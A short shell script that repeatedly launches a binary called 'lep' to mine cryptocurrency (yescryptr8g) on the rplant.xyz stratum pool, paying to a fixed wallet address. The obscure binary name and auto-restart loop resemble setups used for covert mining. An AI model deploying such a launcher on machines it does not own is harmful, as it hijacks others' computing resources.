#!/bin/sh
#

while [ 1 ]; do
./lep -a yescryptr8g -o stratum+tcps://stratum-eu.rplant.xyz:13032 -u k1AyQgmUPqFterccPqcu1tXakNMLiZGJN3K.o2
sleep 5
done
